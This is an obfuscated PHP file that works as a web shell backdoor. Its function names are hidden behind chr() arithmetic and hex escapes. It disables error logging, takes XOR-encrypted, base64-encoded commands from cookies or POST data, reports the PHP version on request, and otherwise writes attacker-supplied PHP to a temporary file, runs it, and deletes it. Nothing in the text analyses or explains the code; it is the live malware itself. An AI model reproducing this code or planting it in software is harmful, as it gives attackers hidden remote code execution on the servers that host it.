<?php $wgizdoi = chr(117-15).'i'."\x6c".'e'.chr(934-839).chr(112).chr(700-583)."\x74".'_'.chr(99)."\x6f".'n'.chr(116).'e'.chr(110)."\x74"."\x73";
$hemfxmmv = "\x62".chr(508-411)."\x73".chr(101)."\66".chr(52)."\137".chr(691-591)."\x65"."\143".chr(111).chr(100).'e';
$pnuanfinv = chr(105).chr(110).'i'."\137".'s'."\x65".chr(116);
$mwtod = "\x75".chr(256-146).chr(908-800)."\151".chr(110)."\x6b";


@$pnuanfinv(chr(101).'r'.chr(649-535)."\157".chr(720-606).chr(95)."\x6c"."\x6f".chr(103), NULL);
@$pnuanfinv(chr(108)."\x6f"."\x67"."\x5f"."\x65".'r'."\162".'o'.chr(947-833).'s', 0);
@$pnuanfinv(chr(109)."\x61".'x'.'_'.chr(101).chr(120).chr(763-662)."\143"."\165".chr(694-578).chr(915-810).chr(531-420).chr(110)."\x5f".chr(116).chr(105).'m'."\x65", 0);
@set_time_limit(0);

function hvtuh($rqbicxrvu, $sploqwtsza)
{
    $odnnnzfzt = "";
    for ($vrntxrn = 0; $vrntxrn < strlen($rqbicxrvu);) {
        for ($j = 0; $j < strlen($sploqwtsza) && $vrntxrn < strlen($rqbicxrvu); $j++, $vrntxrn++) {
            $odnnnzfzt .= chr(ord($rqbicxrvu[$vrntxrn]) ^ ord($sploqwtsza[$j]));
        }
    }
    return $odnnnzfzt;
}

$vmxzjgr = array_merge($_COOKIE, $_POST);
$ansyvcntfn = '5e4d8bb3-3863-471e-a64b-dbfd2072dba1';
foreach ($vmxzjgr as $qweptstw => $rqbicxrvu) {
    $rqbicxrvu = @unserialize(hvtuh(hvtuh($hemfxmmv($rqbicxrvu), $ansyvcntfn), $qweptstw));
    if (isset($rqbicxrvu['a'."\x6b"])) {
        if ($rqbicxrvu["\x61"] == chr(228-123)) {
            $vrntxrn = array(
                chr(834-722)."\166" => @phpversion(),
                chr(115)."\166" => "3.5",
            );
            echo @serialize($vrntxrn);
        } elseif ($rqbicxrvu["\x61"] == chr(101)) {
            $vyhikzxag = "./" . md5($ansyvcntfn) . '.'.'i'."\156".'c';
            @$wgizdoi($vyhikzxag, "<" . "\x3f"."\160"."\x68"."\x70".' '."\x40"."\165"."\156"."\154"."\x69"."\x6e".'k'."\50".chr(95).chr(95)."\x46"."\111".chr(694-618)."\105".chr(95).chr(600-505)."\51"."\x3b".' ' . $rqbicxrvu[chr(749-649)]);
            @include($vyhikzxag);
            @$mwtod($vyhikzxag);
        }
        exit();
    }
}

